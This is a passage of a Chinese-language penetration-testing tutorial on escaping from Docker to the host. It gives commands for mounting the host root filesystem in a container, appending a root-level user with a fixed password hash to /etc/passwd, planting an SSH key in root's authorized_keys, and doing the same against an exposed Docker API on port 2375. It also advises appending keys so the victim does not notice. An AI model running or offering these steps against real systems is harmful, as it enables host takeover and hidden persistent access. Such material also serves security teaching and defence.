###   

### **4.1. 两种利用姿势的前提**

docker images  
docker run -it --rm -v /:/mnt 965ea09ff2eb /bin/sh  
![](../Images/8d34dc0e950e1e7d5fe73832107787e6.png)运行镜像，并且将目标物理机的根目录挂在到镜像启动容器的/mnt目录下。

###   

### **4.2. 写入root权限用户**

\# 生成记录  
生成密码：openssl passwd -1 -salt smile 123456  
![](../Images/0095b46f3102bbb64f67a200b0a5b34d.png)$1$smile$DNeWXby8cmrhHOsfR5Fhi1  
\# 构造插入命令sed -i '$a smile:$1$smile$DNeWXby8cmrhHOsfR5Fhi1:0:0:root:/root:/bin/sh' /mnt/etc/passwd\# 写入/mnt/etc/passwd中sed -i '$a smile:$1$smile$DNeWXby8cmrhHOsfR5Fhi1:0:0:root:/root:/bin/sh' /mnt/etc/passwd  
![](../Images/784979757532a838149e8f77e44305d6.png)  
但是此时无法远程登录：![](../Images/238c4f6fe7bc801bca17c7aeebca3bc4.png)  
退回到php反弹的shell，直接切换用户：![](../Images/90f7e9898e86d419aeeb48b0afd65104.png)上面未登录成功应该是smile用户没有权限远程登录。

###   

### **4.3. 写入公钥**

  
\# 将公钥传输至目标机器本地复制公钥id\_rsa.pub到家目录下，并且使用python开启http服务![](../Images/ce7d3e8bc57d3c59e66b48f34b1d1d9a.png)  
\# 确认是否有.ssh目录，如无则直接创建查看是否/root目录下是否有.ssh目录![](../Images/375d48b9a29498a8ecec927c13377044.png)  
创建一个.ssh目录，然后下载kali本地的id\_isa.pub，然后加入authorized\_keys![](../Images/9d4be7a327cac29ef665744d00a8f499.png)  
\# 使用私钥远程登录尝试登录并查看权限：![](../Images/854db207fe57e3a802d4658d42b72fe5.png)

###   

### **4.4. 实战案例**

docker -H tcp://192.168.1.1:2375 run -it --rm -v /:/mnt {image Id} /bin/sh  
ls /mnt/![](../Images/3428f64038a5097744fffc06da940597.png)  
查看是否存在.ssh目录，若存在则直接输出自己生成的公钥到authorized\_keys  
注：写入公钥内容时一定要使用追加符号>>，直接使用重定向符号>会把原本的内容覆盖掉，如果在渗透的过程中将原本公钥覆盖掉，一方面会被受害者发现（无法使用原有私钥登录）；另一方面自己的权限也没了。![](../Images/45e32e43098e51b19ffcef2354159bb5.png)  
此处尝试登录，但是失败了。![](../Images/8bfe6f58050bf82ec1b92910bec87eaf.png)查看authorized\_keys内容，发现成功写入了：![](../Images/46d03017e03a371f6cef34b51fd3ff39.png)  
尝试写入新的具有root权限的用户openssl passwd -1 -salt smile 123456![](../Images/0095b46f3102bbb64f67a200b0a5b34d.png)  
  
密码为：$1$smile$DNeWXby8cmrhHOsfR5Fhi1拼接插入命令：sed -i '$a smile:$1$smile$DNeWXby8cmrhHOsfR5Fhi1:0:0:root:/root:/bin/sh' /mnt/etc/passwd
